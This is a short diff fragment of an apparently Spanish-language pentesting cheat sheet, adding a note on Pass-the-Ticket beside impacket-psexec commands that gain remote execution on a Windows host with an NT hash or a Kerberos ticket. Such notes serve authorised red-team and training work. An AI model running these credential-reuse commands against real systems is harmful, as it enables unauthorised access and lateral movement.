@@ -27,3 +27,5 @@ impacket-psexec -hashes :HASH_NT dominio/usuario@IP_OBJETIVO
 ```
 impacket-psexec -k -no-pass dominio/usuario@IP_OBJETIVO
 ```
+> Usando Tickets de Kerberos (Pass-the-Ticket)
+> Si ya has solicitado un ticket Kerberos válido y lo tienes cargado en tu variable de entorno (export KRB5CCNAME=/ruta/ticket.ccache):
